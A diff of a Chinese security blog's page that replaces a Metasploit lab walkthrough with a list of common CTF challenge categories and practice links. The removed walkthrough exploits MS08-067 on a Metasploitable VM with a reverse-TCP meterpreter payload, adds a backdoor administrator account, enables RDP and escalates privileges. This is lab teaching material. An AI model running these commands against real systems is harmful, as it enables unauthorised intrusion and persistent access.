@@ -4,42 +4,35 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>基于Metasploit的简单渗透测试 | Hello_C技术博客</title>
+    <title>CTF常见题型 | Hello_C技术博客</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="Hello_C">
     
 
     
-    <meta name="description" content="0x00 MetasploitableMetasploitable漏洞演练系统，基于ubuntu、xp操作系统，本身设计作为安全工具测试和演示常见漏洞攻击，他的作用是用来作为MSF攻击用的靶机,他是一个具有无数未打补丁漏洞与开放了无数高危端口的渗透演练系统，可以使我们进行练习。本次测试使用xp系统的靶机，下载地址http://pan.baidu.com/s/1geMxsuJ  密码：xst1
-0x">
+    <meta name="description" content="0x01 Web
+一、爆破，包括包括md5、爆破随机数、验证码识别等
+二、绕WAF，包括花式绕Mysql、绕文件读取关键词检测之类拦截
+
+1234注入：http://103.238.227.13:10087/盲注：http://ctf5.shiyanbar.com/web/wonderkun/index.php注入绕过：http://a.sql.bugku.com/web2/  提示 !,!=,=">
 <meta property="og:type" content="article">
-<meta property="og:title" content="基于Metasploit的简单渗透测试">
-<meta property="og:url" content="http://yoursite.com/uncategorized/2016/12/08/基于Metasploit的简单渗透测试.html">
+<meta property="og:title" content="CTF常见题型">
+<meta property="og:url" content="http://yoursite.com/CTF/2017/04/29/CTF常见题型.html">
 <meta property="og:site_name" content="Hello_C技术博客">
-<meta property="og:description" content="0x00 MetasploitableMetasploitable漏洞演练系统，基于ubuntu、xp操作系统，本身设计作为安全工具测试和演示常见漏洞攻击，他的作用是用来作为MSF攻击用的靶机,他是一个具有无数未打补丁漏洞与开放了无数高危端口的渗透演练系统，可以使我们进行练习。本次测试使用xp系统的靶机，下载地址http://pan.baidu.com/s/1geMxsuJ  密码：xst1
-0x">
-<meta property="og:image" content="http://p1.bpimg.com/567571/826753312810080e.png">
-<meta property="og:image" content="http://p1.bpimg.com/567571/7ca9db29aad66a2b.png">
-<meta property="og:image" content="http://p1.bpimg.com/567571/a638f3936515e739.png">
-<meta property="og:image" content="http://p1.bpimg.com/567571/96be5eca3ce882a7.png">
-<meta property="og:image" content="http://p1.bpimg.com/567571/307cb59fc9f7f5d8.png">
-<meta property="og:image" content="http://p1.bpimg.com/567571/732dc3a4eae6550e.png">
-<meta property="og:image" content="http://p1.bpimg.com/567571/ee09a90f249e897a.png">
-<meta property="og:image" content="http://p1.bpimg.com/567571/f662c66695f1fc58.png">
-<meta property="og:image" content="http://p1.bqimg.com/567571/5c47668de1bc99a3.png">
-<meta property="og:image" content="http://p1.bqimg.com/567571/2b949608e42b51eb.png">
-<meta property="og:image" content="http://p1.bqimg.com/567571/2fda087ffd9a4256.png">
-<meta property="og:image" content="http://p1.bqimg.com/567571/a7728ce712c626d0.png">
-<meta property="og:image" content="http://p1.bqimg.com/567571/bbc3e104976b7066.png">
-<meta property="og:image" content="http://p1.bpimg.com/567571/a6d950f8675b26b2.jpg">
-<meta property="og:image" content="http://p1.bpimg.com/567571/1fb1e2c8eb2603d1.jpg">
-<meta property="og:updated_time" content="2016-12-08T02:05:05.904Z">
+<meta property="og:description" content="0x01 Web
+一、爆破，包括包括md5、爆破随机数、验证码识别等
+二、绕WAF，包括花式绕Mysql、绕文件读取关键词检测之类拦截
+
+1234注入：http://103.238.227.13:10087/盲注：http://ctf5.shiyanbar.com/web/wonderkun/index.php注入绕过：http://a.sql.bugku.com/web2/  提示 !,!=,=">
+<meta property="og:updated_time" content="2017-04-29T05:15:00.783Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="基于Metasploit的简单渗透测试">
-<meta name="twitter:description" content="0x00 MetasploitableMetasploitable漏洞演练系统，基于ubuntu、xp操作系统，本身设计作为安全工具测试和演示常见漏洞攻击，他的作用是用来作为MSF攻击用的靶机,他是一个具有无数未打补丁漏洞与开放了无数高危端口的渗透演练系统，可以使我们进行练习。本次测试使用xp系统的靶机，下载地址http://pan.baidu.com/s/1geMxsuJ  密码：xst1
-0x">
-<meta name="twitter:image" content="http://p1.bpimg.com/567571/826753312810080e.png">
+<meta name="twitter:title" content="CTF常见题型">
+<meta name="twitter:description" content="0x01 Web
+一、爆破，包括包括md5、爆破随机数、验证码识别等
+二、绕WAF，包括花式绕Mysql、绕文件读取关键词检测之类拦截
+
+1234注入：http://103.238.227.13:10087/盲注：http://ctf5.shiyanbar.com/web/wonderkun/index.php注入绕过：http://a.sql.bugku.com/web2/  提示 !,!=,=">
 
     
     <link rel="alternative" href="/atom.xml" title="Hello_C技术博客" type="application/atom+xml">
@@ -100,14 +93,14 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/uncategorized/2016/12/08/基于Metasploit的简单渗透测试.html" title="基于Metasploit的简单渗透测试" itemprop="url">基于Metasploit的简单渗透测试</a>
+      <a href="/CTF/2017/04/29/CTF常见题型.html" title="CTF常见题型" itemprop="url">CTF常见题型</a>
   </h1>
   <p class="article-author">By
        
 		<a href="/about" title="Hello_C" target="_blank" itemprop="author">Hello_C</a>
 		
   <p class="article-time">
-    <time datetime="2016-12-08T01:41:23.000Z" itemprop="datePublished"> 发表于 2016-12-08</time>
+    <time datetime="2017-04-29T05:11:47.000Z" itemprop="datePublished"> 发表于 2017-04-29</time>
     
   </p>
 </header>
@@ -116,70 +109,73 @@
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">文章目录</strong>
 		
-			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-Metasploitable"><span class="toc-number">1.</span> <span class="toc-text">0x00 Metasploitable</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-查看详细信息"><span class="toc-number">2.</span> <span class="toc-text">0x01 查看详细信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Metasploit的利用"><span class="toc-number"></span> <span class="toc-text">0x02 Metasploit的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-提权"><span class="toc-number">1.</span> <span class="toc-text">0x03 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-补充知识"><span class="toc-number">2.</span> <span class="toc-text">0x04 补充知识</span></a></li></ol>
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Web"><span class="toc-number">1.</span> <span class="toc-text">0x01 Web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X02-Misc"><span class="toc-number">2.</span> <span class="toc-text">0X02 Misc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Crypto"><span class="toc-number">3.</span> <span class="toc-text">0x03 Crypto</span></a></li></ol>
 		
 		</div>
 		
-		<h3 id="0x00-Metasploitable"><a href="#0x00-Metasploitable" class="headerlink" title="0x00 Metasploitable"></a>0x00 Metasploitable</h3><p>Metasploitable漏洞演练系统，基于ubuntu、xp操作系统，本身设计作为安全工具测试和演示常见漏洞攻击，他的作用是用来作为MSF攻击用的靶机,他是一个具有无数未打补丁漏洞与开放了无数高危端口的渗透演练系统，可以使我们进行练习。<br>本次测试使用xp系统的靶机，下载地址<br><a href="http://pan.baidu.com/s/1geMxsuJ" target="_blank" rel="external">http://pan.baidu.com/s/1geMxsuJ</a>  密码：xst1</p>
-<h3 id="0x01-查看详细信息"><a href="#0x01-查看详细信息" class="headerlink" title="0x01 查看详细信息"></a>0x01 查看详细信息</h3><p>使用nmap进行探测发现，使用nmap结合脚本进行扫描测试：<br><a id="more"></a><br>    nmap -sT -A –script=smb-check-vulns -P0 192<br>    -sT 使用TCP Connect扫描<br>    -A 是指高级操作系统探测功能，对一个特定服务进行更深的旗标和指纹攫取<br>    –script=smb-check-vulns 调用smb-check-vulns脚本<br>    -P0 进行更深层次的扫描，不进行主机发现.168.0.146</p>
-<p><img src="http://p1.bpimg.com/567571/826753312810080e.png" alt=""><br><img src="http://p1.bpimg.com/567571/7ca9db29aad66a2b.png" alt=""><br>发现探测出MS08-067漏洞，使用Metasploit进行攻击利用。</p>
-<h2 id="0x02-Metasploit的利用"><a href="#0x02-Metasploit的利用" class="headerlink" title="0x02 Metasploit的利用"></a>0x02 Metasploit的利用</h2><p>2.1 查找 MS08-067相关的模块<br><img src="http://p1.bpimg.com/567571/a638f3936515e739.png" alt=""></p>
-<p>2.2 使用选中的模块并查看<br><img src="http://p1.bpimg.com/567571/96be5eca3ce882a7.png" alt=""></p>
-<pre><code>set TARGET 5
-</code></pre><p>2.2 设置攻击参数<br>show options 查看一下参数，确保无误<br>设置PAYLOAD（攻击载荷）<br>set PAYLOAD windows/meterpreter/reverse_tcp<br>set RHOST 192.168.1.146 设置远程主机IP地址<br>set LHOST 192.168.1.179 设置反向连接地址为本机IP地址<br>set LPORT 55555 设置本机监听的TCP端口号<br>这个载荷在攻击成功后，会从目标主机发起一个反弹连接，连接到LHOST中指定的IP地址。</p>
-<p><img src="http://p1.bpimg.com/567571/307cb59fc9f7f5d8.png" alt=""></p>
-<p><img src="http://p1.bpimg.com/567571/732dc3a4eae6550e.png" alt=""></p>
-<p>2.3 开始攻击，发现已经上钩；</p>
-<p><img src="http://p1.bpimg.com/567571/ee09a90f249e897a.png" alt=""></p>
-<p><img src="http://p1.bpimg.com/567571/f662c66695f1fc58.png" alt=""></p>
-<h3 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h3><p>3.1 查看权限，判断是否需要进行提权</p>
-<blockquote>
-<p>getuid</p>
-</blockquote>
-<p><img src="http://p1.bqimg.com/567571/5c47668de1bc99a3.png" alt=""></p>
-<p>3.2 增加用户名并设置为管理员</p>
-<blockquote>
-<p>net user zjw 123 /add<br>net localgroup administrators zjw /add</p>
-</blockquote>
-<p><img src="http://p1.bqimg.com/567571/2b949608e42b51eb.png" alt=""><br><img src="http://p1.bqimg.com/567571/2fda087ffd9a4256.png" alt=""><br>3.3 开启3389端口远程登录</p>
-<blockquote>
-<p>run getgui -e </p>
-</blockquote>
-<p><img src="http://p1.bqimg.com/567571/a7728ce712c626d0.png" alt=""><br>3.4 远程连接目标主机</p>
-<blockquote>
-<p>rdesktop -f -a 16 192.168.0.146:3389<br>成功登陆目标主机</p>
-</blockquote>
-<p><img src="http://p1.bqimg.com/567571/bbc3e104976b7066.png" alt=""></p>
-<h3 id="0x04-补充知识"><a href="#0x04-补充知识" class="headerlink" title="0x04 补充知识"></a>0x04 补充知识</h3><p>4.1 拿到shell只是普通用户怎么办？<br>上面演示的直接就是最高权限，当然这种情况在平时渗透测试中也是比较少见的，那么我们就得进行提权了。</p>
-<pre><code>meterpreter &gt; background
-msf exploit(handler) &gt; search ms16
-msf exploit(handler) &gt; use exploit/windows/local/ms16_016_webdav
-msf exploit(ms16_016_webdav) &gt; info
-msf exploit(ms16_016_webdav) &gt; show options
-msf exploit(ms16_016_webdav) &gt; set SESSION 1    # 设置会刚才我们后门连接的ID号 1
-msf exploit(ms16_016_webdav) &gt; exploit
-msf exploit(ms16_016_webdav) &gt; sessions
-msf exploit(ms16_016_webdav) &gt; sessions -i 1
-meterpreter &gt; getuid
-</code></pre><p><img src="http://p1.bpimg.com/567571/a6d950f8675b26b2.jpg" alt=""><br>这是发现我们怎么还是普通权限，我们进行查看进程。然后加载我们的进程号</p>
-<pre><code>meterpreter &gt; ps
-meterpreter &gt; migrate + 进程号
-</code></pre><p><img src="http://p1.bpimg.com/567571/1fb1e2c8eb2603d1.jpg" alt=""><br>这样已经提升为了system权限</p>
-<p>4.2 有时候我们在公网而目标主机在内网如何登陆？<br>这时候就要使用端口转发来实现了，将目标主机的端口转发到我们本机。</p>
-<pre><code>portfwd add -l 你本机的监听端口 -r 127.0.0.1 -p 3389
-</code></pre><p>执行之后所有端口3389的内网流量都会通过这个meterpreter的会话来转发到你kali的127.0.0.1的指定端口上 。<br>假如在这里我设置的监听端口为2222，那么我执行的就是</p>
-<pre><code>portfwd add -l 2222 -r 127.0.0.1 -p 3389
-</code></pre><p>然后开始连接远程桌面。新建一个终端窗口，执行连接Windows远程桌面的命令就OK了。</p>
-<pre><code>rdesktop 127.0.0.1:2222
-</code></pre>  
+		<h2 id="0x01-Web"><a href="#0x01-Web" class="headerlink" title="0x01 Web"></a>0x01 Web</h2><ul>
+<li>一、爆破，包括包括md5、爆破随机数、验证码识别等</li>
+<li>二、绕WAF，包括花式绕Mysql、绕文件读取关键词检测之类拦截</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">注入：http://103.238.227.13:10087/</div><div class="line">盲注：http://ctf5.shiyanbar.com/web/wonderkun/index.php</div><div class="line">注入绕过：http://a.sql.bugku.com/web2/  提示 !,!=,=,+,-,^,%</div><div class="line">http://web.jarvisoj.com:32787/</div></pre></td></tr></table></figure>
+<a id="more"></a>
+<ul>
+<li>三、花式玩弄几个PHP特性，包括弱类型，strpos和===，反序列化+destruct、\0截断、iconv截断、</li>
+<li>四、PHP伪协议，zip://、phar://、php://filter/read等</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://web.jarvisoj.com:32768/</div></pre></td></tr></table></figure>
+<ul>
+<li>五、各种找源码技巧，包括git、svn、xxx.php.swp、<em>www</em>.(zip|tar.gz|rar|7z)、xxx.php.bak、</li>
+<li>六、文件上传，包括花式文件后缀 .php345 .inc .phtml .phpt .phps、各种文件内容检测&lt;?php &lt;? &lt;% 、花式解析漏洞</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://c.bugku.com/web9/</div><div class="line">http://web.jarvisoj.com:32790/</div><div class="line">http://web.jarvisoj.com:32785/index.php#</div></pre></td></tr></table></figure>
+<ul>
+<li>七、Mysql类型差异，包括和PHP弱类型类似的特性,0x、0b、1e之类，varchar和integer相互转换</li>
+<li>八、open_basedir、disable_functions花式绕过技巧，包括dl、mail、imagick、bash漏洞、DirectoryIterator及各种二进制选手插足的方法</li>
+<li>九、条件竞争，包括竞争删除前生成shell、竞争数据库无锁多扣钱</li>
+<li>十、windows特性，包括短文件名、IIS解析漏洞、NTFS文件系统通配符、::$DATA，冒号截断</li>
+<li>十一、SSRF，包括花式探测端口，302跳转、花式协议利用、gophar直接取shell等</li>
+<li>十二、XSS，各种浏览器auditor绕过、富文本过滤黑白名单绕过、flash xss、CSP绕过</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">XSS:http://103.238.227.13:10089/</div></pre></td></tr></table></figure>
+<ul>
+<li>十三、XXE，各种XML存在地方（rss/word/流媒体）、各种XXE利用方法（SSRF、文件读取）</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://web.jarvisoj.com:9882/  请设法获得目标机器/home/ctf/flag.txt中的flag值。</div></pre></td></tr></table></figure>
+<ul>
+<li>十四、协议，花式IP伪造 X-Forwarded-For/X-Client-IP/X-Real-IP/CDN-Src-IP、花式改UA，花式藏FLAG、花式分析数据包</li>
+<li>十五、python脚本，盲注脚本、POST提交脚本等，常见python库</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">urllib、urllib2、requests   # 发送 HTTP 请求的</div><div class="line">urlparse                    # 处理 url </div><div class="line">re                          # 正则表达式</div><div class="line">random                      # 生成随机数的</div><div class="line">hashlib                     # 集成md5算法</div><div class="line">base64                      # base64编码</div><div class="line">socket                      # 套接字</div><div class="line">os/sys      </div><div class="line"></div><div class="line">练习：http://c.bugku.com/web6/</div></pre></td></tr></table></figure>
+<h2 id="0X02-Misc"><a href="#0X02-Misc" class="headerlink" title="0X02 Misc"></a>0X02 Misc</h2><ul>
+<li>一、压缩包加密，伪加密、暴力破解、明文攻击、CRC32碰撞</li>
+<li>二、图片隐写，LSB、Stegsolve、binwalk、foremost、JPHS、文件头部属性、RGB图片像素点还原</li>
+<li>三、音频隐写，MP3Stego、分析频谱</li>
+<li>四、流量包分析，追踪流、直接导出、binwalk、foremost</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1、[这么多数据包找找吧，先找到getshell的流]http://ctf.bugku.com/files/bcd48bf8357a2f4e41ef16705443c46e/CTF.pcapng.zip</div><div class="line">2、 http://ctf5.shiyanbar.com/misc/misc300.zip</div></pre></td></tr></table></figure>
+<ul>
+<li>五、社工，包括花式查社工库、微博、QQ签名、whois</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1、[简单个人信息搜集](http://ctf.bugku.com/files/578343f52edfa1107fae1c76f0f9a48a/1.zip)</div><div class="line">2、name:孤长离  提示：弱口令</div></pre></td></tr></table></figure>
+<h2 id="0x03-Crypto"><a href="#0x03-Crypto" class="headerlink" title="0x03 Crypto"></a>0x03 Crypto</h2><ul>
+<li>一、古典密码</li>
+<li>二、现代密码，RSA、hash长度扩展、异或、移位加密各种变形、32位随机数过小、唯密文攻击</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">链接: http://pan.baidu.com/s/1i4TQoz7 密码: w65m</div><div class="line">提示：第一层：CRC32 碰撞;第二层：维吉尼亚密码;第三层：sha1 碰撞;第四层：md5 相同文件不同;第五层：RSA</div><div class="line">RSA：http://ctf5.shiyanbar.com/crypto/RSA</div><div class="line">唯密文攻击：http://ctf5.shiyanbar.com/crypto/ciphertext.zip（试试看破解这个 1024 位 RSA 系统。flag的形式是 CTF&#123;USTC-X&#125;，X 是 RSA 的两个素数中较小的那个（取其大写MD5的前6位））</div></pre></td></tr></table></figure>  
 	</div>
 		<footer class="article-footer clearfix">
 <div class="article-catetags">
 
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/CTF/">CTF</a>
+</div>
+
 
   <div class="article-tags">
   
-  <span></span> <a href="/tags/渗透测试/">渗透测试</a><a href="/tags/Metasploit/">Metasploit</a>
+  <span></span> <a href="/tags/CTF/">CTF</a>
   </div>
 
 </div>
@@ -223,19 +219,11 @@ meterpreter &gt; migrate + 进程号
 	
 <nav class="article-nav clearfix">
  
- <div class="prev" >
- <a href="/渗透/2016/12/09/Nessus的安装与使用.html" title="Nessus的安装与使用">
-  <strong>上一篇：</strong><br/>
-  <span>
-  Nessus的安装与使用</span>
-</a>
-</div>
-
 
 <div class="next">
-<a href="/漏洞/2016/11/30/变量覆盖.html"  title="变量覆盖">
+<a href="/CTF/2017/04/24/CBC字节翻转攻击.html"  title="CBC字节翻转攻击">
  <strong>下一篇：</strong><br/> 
- <span>变量覆盖
+ <span>CBC字节翻转攻击
 </span>
 </a>
 </div>
@@ -244,7 +232,7 @@ meterpreter &gt; migrate + 进程号
 
 	
 <section id="comments" class="comment">
-	<div class="ds-thread" data-thread-key="uncategorized/2016/12/08/基于Metasploit的简单渗透测试.html" data-title="基于Metasploit的简单渗透测试" data-url="http://yoursite.com/uncategorized/2016/12/08/基于Metasploit的简单渗透测试.html"></div>
+	<div class="ds-thread" data-thread-key="CTF/2017/04/29/CTF常见题型.html" data-title="CTF常见题型" data-url="http://yoursite.com/CTF/2017/04/29/CTF常见题型.html"></div>
 </section>
 
 
@@ -254,7 +242,7 @@ meterpreter &gt; migrate + 进程号
   <div id="toc" class="toc-aside">
   <strong class="toc-title">文章目录</strong>
  
- <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-Metasploitable"><span class="toc-number">1.</span> <span class="toc-text">0x00 Metasploitable</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-查看详细信息"><span class="toc-number">2.</span> <span class="toc-text">0x01 查看详细信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Metasploit的利用"><span class="toc-number"></span> <span class="toc-text">0x02 Metasploit的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-提权"><span class="toc-number">1.</span> <span class="toc-text">0x03 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-补充知识"><span class="toc-number">2.</span> <span class="toc-text">0x04 补充知识</span></a></li></ol>
+ <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Web"><span class="toc-number">1.</span> <span class="toc-text">0x01 Web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X02-Misc"><span class="toc-number">2.</span> <span class="toc-text">0X02 Misc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Crypto"><span class="toc-number">3.</span> <span class="toc-text">0x03 Crypto</span></a></li></ol>
  
   </div>
 
